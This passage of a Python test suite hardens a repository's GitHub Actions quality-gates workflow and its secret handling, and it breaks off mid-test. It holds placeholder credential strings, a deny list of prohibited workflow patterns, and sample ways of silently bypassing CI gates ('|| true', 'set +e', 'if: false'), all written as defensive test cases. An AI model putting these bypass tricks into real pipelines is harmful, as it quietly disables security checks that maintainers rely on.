def _tracked_app_roots() -> frozenset[str]:
    roots: set[str] = set()
    for path in _tracked_files():
        parts = path.relative_to(REPO_ROOT).parts
        if len(parts) >= 2 and parts[0] == "apps":
            roots.add("/".join(parts[:2]))
    return frozenset(roots)


def _tracked_integration_tests() -> frozenset[str]:
    return frozenset(
        path.relative_to(REPO_ROOT).as_posix()
        for path in _tracked_files()
        if path.relative_to(REPO_ROOT).as_posix().startswith("tests/integration/")
    )


def _tracked_acceptance_tests() -> frozenset[str]:
    return frozenset(
        path.relative_to(REPO_ROOT).as_posix()
        for path in _tracked_files()
        if path.relative_to(REPO_ROOT).as_posix().startswith("tests/acceptance/")
    )


def _tracked_top_level_paths() -> frozenset[str]:
    return frozenset(path.relative_to(REPO_ROOT).parts[0] for path in _tracked_files())


def _tracked_github_paths() -> frozenset[str]:
    return frozenset(
        path.relative_to(REPO_ROOT).as_posix()
        for path in _tracked_files()
        if path.relative_to(REPO_ROOT).as_posix().startswith(".github/")
    )


def _quality_gates_workflow_text() -> str:
    return QUALITY_GATES_WORKFLOW.read_text(encoding="utf-8")


def _normalized_workflow_text() -> str:
    return re.sub(r"\s+", " ", _quality_gates_workflow_text())


def _workflow_action_refs() -> tuple[str, ...]:
    refs: list[str] = []
    for line in _quality_gates_workflow_text().splitlines():
        stripped = line.strip()
        if stripped.startswith("uses: "):
            refs.append(stripped.removeprefix("uses: ").split("#", maxsplit=1)[0].strip())
    return tuple(refs)


def _reject_workflow_yaml_anchors_and_aliases(workflow_text: str) -> None:
    for event in yaml.parse(workflow_text, Loader=_QualityGateWorkflowLoader):
        if isinstance(event, AliasEvent):
            msg = "YAML aliases are not authorized in the quality-gates workflow"
            raise AssertionError(msg)
        if getattr(event, "anchor", None) is not None:
            msg = "YAML anchors are not authorized in the quality-gates workflow"
            raise AssertionError(msg)


def _parse_quality_gate_workflow(workflow_text: str) -> dict[str, object]:
    try:
        _reject_workflow_yaml_anchors_and_aliases(workflow_text)
        parsed = yaml.load(workflow_text, Loader=_QualityGateWorkflowLoader)
    except yaml.YAMLError as exc:
        msg = f"quality-gates workflow YAML is not authorized: {exc}"
        raise AssertionError(msg) from exc
    if not isinstance(parsed, dict):
        msg = "quality-gates workflow YAML must parse to a mapping"
        raise AssertionError(msg)
    return cast(dict[str, object], parsed)


def _workflow_permission_violations(workflow: dict[str, object]) -> tuple[str, ...]:
    violations: list[str] = []

    permissions = workflow.get("permissions")
    if permissions != AUTHORIZED_WORKFLOW_PERMISSIONS:
        violations.append(
            "workflow permissions must be exactly "
            f"{AUTHORIZED_WORKFLOW_PERMISSIONS!r}; got {permissions!r}"
        )

    jobs = workflow.get("jobs")
    if not isinstance(jobs, dict):
        violations.append(f"jobs must be a mapping; got {jobs!r}")
        return tuple(violations)

    for job_name, job_config in jobs.items():
        if not isinstance(job_config, dict):
            violations.append(f"job {job_name!r} must be a mapping; got {job_config!r}")
            continue
        if "permissions" in job_config:
            violations.append(
                f"job-level permissions are not authorized: {job_name!r} -> "
                f"{job_config['permissions']!r}"
            )

    return tuple(violations)


def _workflow_trigger_violations(workflow: dict[str, object]) -> tuple[str, ...]:
    triggers = workflow.get("on")
    if triggers != AUTHORIZED_WORKFLOW_TRIGGERS:
        return (
            f"workflow triggers must be exactly {AUTHORIZED_WORKFLOW_TRIGGERS!r}; got {triggers!r}",
        )
    return ()


def _normalized_workflow_run(run: object) -> str | None:
    if not isinstance(run, str):
        return None
    return " ".join(run.split())


def _workflow_step_violations(
    job_name: str,
    step_index: int,
    step: object,
    expected_step: dict[str, object],
) -> tuple[str, ...]:
    if not isinstance(step, dict):
        return (f"job {job_name!r} step {step_index} must be a mapping; got {step!r}",)

    violations: list[str] = []
    expected_keys = frozenset(expected_step)
    actual_keys = frozenset(step)
    if actual_keys != expected_keys:
        violations.append(
            f"job {job_name!r} step {step_index} keys changed: "
            f"expected {sorted(expected_keys)!r}; got {sorted(actual_keys)!r}"
        )

    expected_name = expected_step["name"]
    if step.get("name") != expected_name:
        violations.append(
            f"job {job_name!r} step {step_index} name changed: "
            f"expected {expected_name!r}; got {step.get('name')!r}"
        )

    if "uses" in expected_step and step.get("uses") != expected_step["uses"]:
        violations.append(
            f"job {job_name!r} step {expected_name!r} action changed: "
            f"expected {expected_step['uses']!r}; got {step.get('uses')!r}"
        )
    if "with" in expected_step and step.get("with") != expected_step["with"]:
        violations.append(
            f"job {job_name!r} step {expected_name!r} action inputs changed: "
            f"expected {expected_step['with']!r}; got {step.get('with')!r}"
        )
    if "run" in expected_step:
        expected_run = _normalized_workflow_run(textwrap.dedent(cast(str, expected_step["run"])))
        actual_run = _normalized_workflow_run(step.get("run"))
        if actual_run != expected_run:
            violations.append(
                f"job {job_name!r} step {expected_name!r} run changed: "
                f"expected {expected_run!r}; got {actual_run!r}"
            )

    return tuple(violations)


def _workflow_required_gate_violations(workflow: dict[str, object]) -> tuple[str, ...]:
    violations: list[str] = []

    actual_top_level_keys = frozenset(workflow)
    if actual_top_level_keys != AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS:
        violations.append(
            "workflow top-level keys changed: expected "
            f"{sorted(AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS)!r}; got "
            f"{sorted(actual_top_level_keys)!r}"
        )
    for key in ("name", "on", "permissions"):
        if workflow.get(key) != EXPECTED_QUALITY_GATES_WORKFLOW[key]:
            violations.append(
                f"workflow {key!r} changed: expected "
                f"{EXPECTED_QUALITY_GATES_WORKFLOW[key]!r}; got {workflow.get(key)!r}"
            )

    jobs = workflow.get("jobs")
    if not isinstance(jobs, dict):
        return (f"jobs must be a mapping; got {jobs!r}",)

    expected_jobs = cast(dict[str, dict[str, object]], EXPECTED_QUALITY_GATES_WORKFLOW["jobs"])
    actual_job_names = frozenset(jobs)
    expected_job_names = frozenset(expected_jobs)
    if actual_job_names != expected_job_names:
        violations.append(
            f"workflow job set changed: expected {sorted(expected_job_names)!r}; "
            f"got {sorted(actual_job_names)!r}"
        )

    for job_name, expected_job in expected_jobs.items():
        job_config = jobs.get(job_name)
        if not isinstance(job_config, dict):
            violations.append(f"required job {job_name!r} must be present as a mapping")
            continue

        expected_job_keys = frozenset(expected_job)
        actual_job_keys = frozenset(job_config)
        if actual_job_keys != expected_job_keys:
            violations.append(
                f"job {job_name!r} keys changed: expected {sorted(expected_job_keys)!r}; "
                f"got {sorted(actual_job_keys)!r}"
            )
        for key in ("name", "runs-on", "timeout-minutes"):
            if job_config.get(key) != expected_job[key]:
                violations.append(
                    f"job {job_name!r} {key!r} changed: expected {expected_job[key]!r}; "
                    f"got {job_config.get(key)!r}"
                )

        steps = job_config.get("steps")
        if not isinstance(steps, list):
            violations.append(f"required job {job_name!r} steps must be a list")
            continue
        for step in steps:
            if not isinstance(step, dict):
                violations.append(f"required job {job_name!r} has non-mapping step {step!r}")
            continue

        expected_steps = cast(tuple[dict[str, object], ...], expected_job["steps"])
        if len(steps) != len(expected_steps):
            violations.append(
                f"job {job_name!r} step count changed: expected {len(expected_steps)}; "
                f"got {len(steps)}"
            )
        for step_index, expected_step in enumerate(expected_steps):
            if step_index >= len(steps):
                violations.append(f"job {job_name!r} missing step {step_index}")
                continue
            violations.extend(
                _workflow_step_violations(job_name, step_index, steps[step_index], expected_step)
            )

    return tuple(violations)


def _workflow_security_violations(workflow: dict[str, object]) -> tuple[str, ...]:
    return (
        *_workflow_permission_violations(workflow),
        *_workflow_trigger_violations(workflow),
        *_workflow_required_gate_violations(workflow),
    )


def _tracked_runtime_source_files() -> frozenset[str]:
    runtime_source = REPO_ROOT / "packages/python/curios_runtime/src/curios_runtime"
    return frozenset(
        path.relative_to(runtime_source).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(runtime_source)
    )


def _tracked_contracts_source_files() -> frozenset[str]:
    return frozenset(
        path.relative_to(CONTRACTS_SOURCE).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(CONTRACTS_SOURCE)
    )


def _tracked_typescript_contracts_source_files() -> frozenset[str]:
    typescript_source = REPO_ROOT / "packages/typescript/curios-contracts/src"
    return frozenset(
        path.relative_to(typescript_source).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(typescript_source)
    )


def _tracked_api_source_files() -> frozenset[str]:
    api_source = REPO_ROOT / "apps/api/src/curios_api"
    return frozenset(
        path.relative_to(api_source).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(api_source)
    )


def _tracked_api_test_files() -> frozenset[str]:
    api_tests = REPO_ROOT / "apps/api/tests"
    return frozenset(
        path.relative_to(api_tests).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(api_tests)
    )


def _tracked_web_source_files() -> frozenset[str]:
    web_source = REPO_ROOT / "apps/web/src"
    return frozenset(
        path.relative_to(web_source).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(web_source)
    )


def _unauthorized_github_paths(paths: frozenset[str]) -> frozenset[str]:
    return paths - AUTHORIZED_GITHUB_PATHS


def _unauthorized_runtime_source_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - M0_AUTHORIZED_RUNTIME_SOURCE_FILES


def _unauthorized_contracts_source_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - ALLOWED_CONTRACTS_SOURCE_FILES


def _unauthorized_typescript_contracts_source_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - ALLOWED_TYPESCRIPT_CONTRACTS_SOURCE_FILES


def _unauthorized_api_source_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - M0_AUTHORIZED_API_SOURCE_FILES


def _unauthorized_api_test_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - M0_AUTHORIZED_API_TEST_FILES


def _unauthorized_web_source_files(paths: frozenset[str]) -> frozenset[str]:
    return paths - M0_AUTHORIZED_WEB_SOURCE_FILES


def _unauthorized_integration_tests(paths: frozenset[str]) -> frozenset[str]:
    return paths - AUTHORIZED_BOOT019_INTEGRATION_TESTS - AUTHORIZED_M0_INTEGRATION_TESTS


def _unauthorized_acceptance_tests(paths: frozenset[str]) -> frozenset[str]:
    return paths - AUTHORIZED_BOOT026_ACCEPTANCE_TESTS - AUTHORIZED_M0_ACCEPTANCE_TESTS


def _unauthorized_package_roots(paths: frozenset[str]) -> frozenset[str]:
    return paths - ALLOWED_PACKAGE_ROOTS


def _unauthorized_app_roots(paths: frozenset[str]) -> frozenset[str]:
    return paths - ALLOWED_APP_ROOTS


def _core_source_files() -> frozenset[str]:
    return frozenset(
        path.relative_to(CORE_SOURCE).as_posix()
        for path in _tracked_files()
        if path.is_relative_to(CORE_SOURCE)
    )


def _core_public_exports() -> frozenset[str]:
    source = (CORE_SOURCE / "__init__.py").read_text(encoding="utf-8")
    tree = ast.parse(source, filename=(CORE_SOURCE / "__init__.py").as_posix())
    for node in ast.walk(tree):
        if (
            isinstance(node, ast.Assign)
            and any(
                isinstance(target, ast.Name) and target.id == "__all__" for target in node.targets
            )
            and isinstance(node.value, ast.Tuple)
        ):
            values = [
                item.value
                for item in node.value.elts
                if isinstance(item, ast.Constant) and isinstance(item.value, str)
            ]
            return frozenset(values)
    return frozenset()


def _pnpm_workspace_packages(path: Path) -> frozenset[str]:
    packages: set[str] = set()
    in_packages_block = False
    for raw_line in path.read_text(encoding="utf-8").splitlines():
        stripped = raw_line.strip()
        if stripped == "packages:":
            in_packages_block = True
            continue
        if in_packages_block and stripped.startswith("- "):
            packages.add(stripped[2:].strip("\"'"))
        elif in_packages_block and stripped and not raw_line.startswith(" "):
            break
    return frozenset(packages)


def _assert_no_security_failure(condition: bool, message: str) -> None:
    assert condition, f"{SECURITY_FAILURE}: {message}"


def test_security_vocabularies_are_exact_and_do_not_collapse_controls() -> None:
    _assert_no_security_failure(
        EFFECT_CLASSIFICATION_VALUES
        == (
            "READ_ONLY",
            "LOCAL_WRITE",
            "EXTERNAL_READ",
            "EXTERNAL_WRITE",
            "DESTRUCTIVE",
            "SECRET_ACCESS",
            "NETWORK_ACCESS",
            "EXECUTION",
        ),
        "effect classification vocabulary changed",
    )
    _assert_no_security_failure(
        "APPROVAL_REQUIRED" not in EFFECT_CLASSIFICATION_VALUES,
        "approval must remain a policy/control outcome, not an effect",
    )
    _assert_no_security_failure(
        RISK_CLASSIFICATION_VALUES == ("LOW", "MODERATE", "HIGH", "CRITICAL"),
        "risk classification vocabulary changed",
    )
    _assert_no_security_failure(
        POLICY_DECISION_OUTCOME_VALUES == ("ALLOW", "DENY", "REQUIRES_APPROVAL", "UNKNOWN"),
        "policy decision outcome vocabulary changed",
    )
    _assert_no_security_failure(
        APPROVAL_OUTCOME_VALUES == ("PENDING", "APPROVED", "REJECTED"),
        "approval outcome vocabulary changed",
    )
    _assert_no_security_failure(
        CONFIGURATION_PROFILE_VALUES == ("LOCAL_DOCKER",),
        "canonical configuration profile vocabulary changed",
    )
    _assert_no_security_failure(
        GOVERNED_EFFECT_VALUES == EFFECT_CLASSIFICATION_VALUES,
        "governed effects must track the canonical M0 effect vocabulary",
    )
    _assert_no_security_failure(
        set(EFFECT_CLASSIFICATION_VALUES).isdisjoint(RISK_CLASSIFICATION_VALUES),
        "effect and risk vocabularies must remain separate",
    )


def test_unknown_policy_for_governed_effects_is_not_authorizing_or_rewritten() -> None:
    decision = PolicyDecision(
        subject_ref=ObjectReference.from_id(fixed_id(WorkId)),
        principal=human_principal(),
        requested_effects=tuple(EffectClassification),
        resource_refs=(_provider_ref(),),
        scope="project sandbox",
        outcome=PolicyDecisionOutcome.UNKNOWN,
        reason="policy unavailable",
        decided_at=UTC_NOW,
    )
    serialized = decision.to_json_compatible()
    parsed = PolicyDecision.from_json_compatible(serialized)

    _assert_no_security_failure(serialized["outcome"] == "UNKNOWN", "UNKNOWN was not serialized")
    _assert_no_security_failure(
        parsed.outcome is PolicyDecisionOutcome.UNKNOWN,
        "UNKNOWN was not preserved during round trip",
    )
    _assert_no_security_failure(not decision.is_authorizing, "UNKNOWN must not authorize effects")
    _assert_no_security_failure(
        decision.outcome is not PolicyDecisionOutcome.DENY,
        "UNKNOWN must not be rewritten as DENY",
    )
    _assert_no_security_failure(
        set(cast(tuple[str, ...], serialized["requested_effects"])) == set(GOVERNED_EFFECT_VALUES),
        "governed effect set was not represented in policy decision evidence",
    )


def test_security_records_do_not_serialize_secret_values_or_credential_fields() -> None:
    serialized_records = [to_json_compatible(record) for record in _security_records()]
    json.dumps(serialized_records, allow_nan=False, sort_keys=True)

    for node in _walk(serialized_records):
        if isinstance(node, str):
            _assert_no_security_failure(
                SECRET_SHAPED_VALUE_RE.search(node) is None,
                "serialized security records must not contain secret-shaped key/value material",
            )
    for node in _walk(serialized_records):
        if isinstance(node, dict):
            prohibited = set(node).intersection(PROHIBITED_SECRET_VALUE_FIELDS)
            _assert_no_security_failure(
                not prohibited,
                "serialized security records expose prohibited secret field(s): "
                f"{sorted(prohibited)}",
            )


def test_tracked_security_surfaces_do_not_contain_secret_shaped_literals() -> None:
    violations = tuple(
        violation
        for path in _tracked_security_scan_files()
        for violation in _secret_scan_violations_for_text(
            path,
            path.read_text(encoding="utf-8"),
        )
    )

    _assert_no_security_failure(
        not violations,
        f"tracked security-scanned surfaces contain secret-shaped literals: {list(violations)}",
    )


def test_secret_scanner_rejects_secret_literals_and_allows_documented_placeholders() -> None:
    real_source = REPO_ROOT / "packages/python/curios_contracts/src/example.py"
    placeholder = REPO_ROOT / "infrastructure/local/docker/.env.example"

    assert _secret_scan_violations_for_text(real_source, 'api_key = "sk-live-value"')
    assert _secret_scan_violations_for_text(
        real_source,
        "url = 'https://user:password@example.test/resource'",
    )
    assert not _secret_scan_violations_for_text(
        placeholder,
        "CURIOS_POSTGRES_PASSWORD=curios_local_dev_password",
    )


def test_secret_principal_and_authority_contracts_reject_secret_value_shapes() -> None:
    with pytest.raises(ValueError, match="secret-shaped"):
        SecretReference(
            secret_provider_ref=_provider_ref(),
            name="password=supersecret",
            scope="local",
            purpose="database",
        )
    with pytest.raises(ValueError, match="credential-bearing URLs"):
        Permission(
            action="read",
            resource_type="artifact",
            scope="https://user:password@example.test/resource",
            permitted_effects=(EffectClassification.EXTERNAL_READ,),
        )
    with pytest.raises(ValueError, match="unexpected field"):
        Principal.from_json_compatible(
            {
                "principal_type": "HUMAN",
                "identity": "operator",
                "credentials": {"token": "secret"},
            }
        )


def test_security_contract_dataclass_fields_do_not_add_secret_value_slots() -> None:
    security_contracts = (
        Approval,
        Authority,
        ConfigurationProfile,
        Permission,
        PolicyDecision,
        Principal,
        SecretReference,
    )
    for contract in security_contracts:
        prohibited = _secret_field_violations(contract)
        _assert_no_security_failure(
            not prohibited,
            f"{contract.__name__} declares prohibited secret field(s): {sorted(prohibited)}",
        )


@pytest.mark.parametrize(
    "field_name",
    (
        "access_token",
        "api_key",
        "client_secret",
        "credential_material",
        "password",
        "private_key",
        "secret",
        "secret_key",
        "session_cookie",
    ),
)
def test_secret_field_detector_rejects_semantic_secret_value_variants(field_name: str) -> None:
    namespace = {"__annotations__": {field_name: str}}
    synthetic = type("SyntheticSecurityRecord", (), namespace)

    # Convert the synthetic class to a dataclass after construction so the
    # detector exercises real dataclass field metadata rather than raw strings.
    from dataclasses import dataclass

    synthetic_dataclass: type[Any] = dataclass(frozen=True)(synthetic)

    assert _secret_field_violations(synthetic_dataclass)


def test_security_contract_source_has_no_runtime_security_imports() -> None:
    import_roots = _import_roots(CONTRACTS_SOURCE)
    violations = import_roots.intersection(SECURITY_IMPLEMENTATION_IMPORTS)

    _assert_no_security_failure(
        not violations,
        "curios_contracts imports security/provider/runtime implementation roots: "
        f"{sorted(violations)}",
    )


def test_local_docker_configuration_examples_remain_placeholder_and_curios_prefixed() -> None:
    env_files = sorted(path for path in (REPO_ROOT / "infrastructure").rglob(".env*"))
    _assert_no_security_failure(
        env_files == [LOCAL_DOCKER_ENV_EXAMPLE],
        "only the committed LOCAL_DOCKER .env.example may exist under infrastructure",
    )

    entries = [
        line.strip()
        for line in LOCAL_DOCKER_ENV_EXAMPLE.read_text(encoding="utf-8").splitlines()
        if line.strip() and not line.lstrip().startswith("#")
    ]
    _assert_no_security_failure(entries != [], "LOCAL_DOCKER .env.example is empty")
    for entry in entries:
        name, separator, value = entry.partition("=")
        _assert_no_security_failure(separator == "=", "environment entry lacks assignment")
        _assert_no_security_failure(
            name.startswith("CURIOS_"),
            f"environment variable {name!r} must use the CURIOS_ prefix",
        )
        _assert_no_security_failure(value != "", f"environment variable {name!r} is empty")
        _assert_no_security_failure(
            "\n" not in value and "\r" not in value,
            f"environment variable {name!r} contains line breaks",
        )


def test_core_context_and_services_do_not_implement_security_authority_engines() -> None:
    _assert_no_security_failure(
        _core_source_files() == ALLOWED_CORE_SOURCE_FILES,
        f"curios_core source topology changed: {sorted(_core_source_files())}",
    )
    _assert_no_security_failure(
        _core_public_exports() == ALLOWED_CORE_EXPORTS,
        f"curios_core public exports changed: {sorted(_core_public_exports())}",
    )
    core_context_fields = set(get_type_hints(CoreContext))
    _assert_no_security_failure(
        core_context_fields == {"observability", "authority"},
        f"CoreContext field set changed: {sorted(core_context_fields)}",
    )
    _assert_no_security_failure(
        get_type_hints(CoreContext)["authority"] == Authority | None,
        "CoreContext authority must remain the frozen optional Authority contract",
    )
    _assert_no_security_failure(
        _declared_class_names(CORE_SOURCE).isdisjoint(CORE_SECURITY_RUNTIME_NAMES),
        "curios_core declared a deferred security runtime class",
    )
    forbidden_methods = {
        name
        for name in _function_names(CORE_SOURCE)
        if any(part in name for part in CORE_FORBIDDEN_SECURITY_METHOD_PARTS)
    }
    _assert_no_security_failure(
        not forbidden_methods,
        f"curios_core declared deferred security authority method(s): {sorted(forbidden_methods)}",
    )

    result = CoreServices().list_provider_descriptors(CoreContext())
    _assert_no_security_failure(result.value == (), "CoreServices changed default behavior")


@pytest.mark.parametrize(
    "tracked_paths",
    (
        frozenset({".github/ISSUE_TEMPLATE/example.md"}),
        frozenset({".github/dependabot.yml"}),
        frozenset({".github/workflows/another-workflow.yml"}),
        frozenset({".github/workflows/quality-gates.yml", ".github/CODEOWNERS"}),
    ),
)
def test_github_topology_detector_rejects_unauthorized_surfaces(
    tracked_paths: frozenset[str],
) -> None:
    assert _unauthorized_github_paths(tracked_paths) == tracked_paths - AUTHORIZED_GITHUB_PATHS


def test_github_topology_detector_allows_only_task_boot_025_workflow() -> None:
    assert not _unauthorized_github_paths(frozenset({".github/workflows/quality-gates.yml"}))


def test_quality_gate_workflow_preserves_boot_security_model_and_runs_m0_gates() -> None:
    workflow_text = _quality_gates_workflow_text()
    workflow = _parse_quality_gate_workflow(workflow_text)
    normalized_workflow = _normalized_workflow_text()
    action_refs = _workflow_action_refs()
    permission_violations = _workflow_permission_violations(workflow)
    trigger_violations = _workflow_trigger_violations(workflow)
    required_gate_violations = _workflow_required_gate_violations(workflow)

    _assert_no_security_failure(action_refs != (), "quality-gates workflow has no actions")
    for action_ref in action_refs:
        _assert_no_security_failure(
            ACTION_FULL_SHA_REF_RE.fullmatch(action_ref) is not None,
            f"GitHub action is not pinned to a full immutable SHA: {action_ref}",
        )

    _assert_no_security_failure(
        not permission_violations,
        f"workflow permissions changed: {list(permission_violations)}",
    )
    _assert_no_security_failure(
        not trigger_violations,
        f"workflow triggers changed: {list(trigger_violations)}",
    )
    _assert_no_security_failure(
        not required_gate_violations,
        f"workflow required quality gates changed: {list(required_gate_violations)}",
    )
    for prohibited in (
        "release:",
        "deployment",
        "environment:",
        "secrets.",
        "ollama serve",
        "docker compose up -d ollama",
        "down -v",
    ):
        _assert_no_security_failure(
            prohibited not in workflow_text,
            f"prohibited workflow pattern present: {prohibited}",
        )

    postgres_provider_index = normalized_workflow.index(
        "uv run pytest tests/integration/test_postgres_provider_integration.py -q"
    )
    m0_postgres_index = normalized_workflow.index(
        "uv run pytest "
        "packages/python/curios_persistence/tests/test_postgres_persistence_integration.py"
    )
    m0_integration_index = normalized_workflow.index(
        "uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q"
    )
    boot_acceptance_index = normalized_workflow.index("uv run pytest tests/acceptance -q")
    full_pytest_index = normalized_workflow.index("uv run pytest -q")
    _assert_no_security_failure(
        postgres_provider_index < m0_postgres_index < m0_integration_index,
        "PostgreSQL and M0 integration tests must run in explicit serial gates",
    )
    _assert_no_security_failure(
        m0_integration_index < boot_acceptance_index < full_pytest_index,
        "M0 integration must run before acceptance and full pytest",
    )


def _security_violations_for_workflow_text(workflow_text: str) -> tuple[str, ...]:
    workflow = _parse_quality_gate_workflow(workflow_text)
    return _workflow_security_violations(workflow)


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "A_current_valid_push_and_pull_request",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
    ),
)
def test_quality_gate_trigger_detector_accepts_only_frozen_trigger_model(
    case_id: str,
    workflow_text: str,
) -> None:
    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))

    assert not _workflow_trigger_violations(workflow), case_id


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "B_push_only",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "C_pull_request_only",
            """
            name: Quality Gates
            on:
              pull_request:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "D_repository_dispatch",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              repository_dispatch:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "E_workflow_run",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              workflow_run:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "F_schedule",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              schedule:
                - cron: "0 * * * *"
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "G_workflow_dispatch",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              workflow_dispatch:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "H_pull_request_target",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              pull_request_target:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "I_release",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              release:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "J_unknown_trigger",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - "**"
              pull_request:
              frobnicate:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "K_missing_on",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "L_scalar_on",
            """
            name: Quality Gates
            on: push
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "M_sequence_on",
            """
            name: Quality Gates
            on:
              - push
              - pull_request
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "wrong_push_branch_filter",
            """
            name: Quality Gates
            on:
              push:
                branches:
                  - main
              pull_request:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
    ),
)
def test_quality_gate_trigger_detector_rejects_non_frozen_trigger_models(
    case_id: str,
    workflow_text: str,
) -> None:
    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))

    assert _workflow_trigger_violations(workflow), case_id


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "N_duplicate_trigger_key",
            """
            name: Quality Gates
            on:
              push:
              push:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "O_trigger_supplied_via_anchor_alias",
            """
            name: Quality Gates
            trigger: &trigger
              push:
                branches:
                  - "**"
              pull_request:
            on: *trigger
            permissions:
              contents: read
            jobs: {}
            """,
        ),
        (
            "O_trigger_supplied_via_merge",
            """
            name: Quality Gates
            on:
              <<:
                push:
                  branches:
                    - "**"
                pull_request:
            permissions:
              contents: read
            jobs: {}
            """,
        ),
    ),
)
def test_quality_gate_trigger_parser_rejects_ambiguous_trigger_yaml(
    case_id: str,
    workflow_text: str,
) -> None:
    with pytest.raises(AssertionError):
        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))


@pytest.mark.parametrize(
    ("case_id", "replacement"),
    (
        (
            "B_remove_gate",
            "",
        ),
        (
            "C_replace_path",
            "      - name: M0 integration tests\n"
            "        run: uv run pytest tests/integration/test_m0_other.py -q\n\n",
        ),
        (
            "D_add_if_false",
            "      - name: M0 integration tests\n"
            "        if: false\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
        ),
        (
            "E_continue_on_error",
            "      - name: M0 integration tests\n"
            "        continue-on-error: true\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
        ),
        (
            "F_prepend_set_plus_e",
            "      - name: M0 integration tests\n"
            "        run: |\n"
            "          set +e\n"
            f"          {M0_INTEGRATION_GATE_COMMAND}\n\n",
        ),
        (
            "G_append_or_true",
            "      - name: M0 integration tests\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND} || true\n\n",
        ),
        (
            "H_append_semicolon_true",
            "      - name: M0 integration tests\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND} ; true\n\n",
        ),
        (
            "I_append_exit_zero",
            "      - name: M0 integration tests\n"
            "        run: |\n"
            f"          {M0_INTEGRATION_GATE_COMMAND}\n"
            "          exit 0\n\n",
        ),
        (
            "J_wrap_failure_swallowing_shell",
            "      - name: M0 integration tests\n"
            "        run: |\n"
            f"          if ! {M0_INTEGRATION_GATE_COMMAND}; then\n"
            "            echo ignored\n"
            "          fi\n\n",
        ),
        (
            "K_unauthorized_conditional_step",
            "      - name: M0 integration tests\n"
            "        if: github.event_name == 'workflow_dispatch'\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
        ),
        (
            "L_duplicate_safe_and_bypassed_gate",
            "      - name: M0 integration tests\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n"
            "      - name: M0 integration tests\n"
            "        if: false\n"
            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
        ),
    ),
)
def test_quality_gate_required_m0_integration_step_rejects_bypass_variants(
    case_id: str,
    replacement: str,
) -> None:
    original = (
        "      - name: M0 integration tests\n"
        "        run: uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q\n\n"
    )
    workflow_text = _quality_gates_workflow_text().replace(original, replacement)

    assert _security_violations_for_workflow_text(workflow_text), case_id


def test_quality_gate_required_m0_integration_step_accepts_exact_current_gate() -> None:
    assert not _security_violations_for_workflow_text(_quality_gates_workflow_text())


@pytest.mark.parametrize(
    ("case_id", "original", "replacement"),
    (
        (
            "repository_dispatch_trigger",
            "  pull_request:\n",
            "  pull_request:\n  repository_dispatch:\n",
        ),
        (
            "workflow_run_trigger",
            "  pull_request:\n",
            "  pull_request:\n  workflow_run:\n",
        ),
        (
            "schedule_trigger",
            "  pull_request:\n",
            '  pull_request:\n  schedule:\n    - cron: "0 * * * *"\n',
        ),
        (
            "workflow_dispatch_trigger",
            "  pull_request:\n",
            "  pull_request:\n  workflow_dispatch:\n",
        ),
        (
            "pull_request_target_trigger",
            "  pull_request:\n",
            "  pull_request:\n  pull_request_target:\n",
        ),
    ),
)
def test_quality_gate_workflow_rejects_extra_trigger_mutations(
    case_id: str,
    original: str,
    replacement: str,
) -> None:
    workflow_text = _quality_gates_workflow_text().replace(original, replacement)

    assert _security_violations_for_workflow_text(workflow_text), case_id


@pytest.mark.parametrize(
    ("case_id", "original", "replacement"),
    (
        (
            "architecture_if_false",
            "      - name: Architecture tests\n        run: uv run pytest tests/architecture -q\n",
            "      - name: Architecture tests\n"
            "        if: false\n"
            "        run: uv run pytest tests/architecture -q\n",
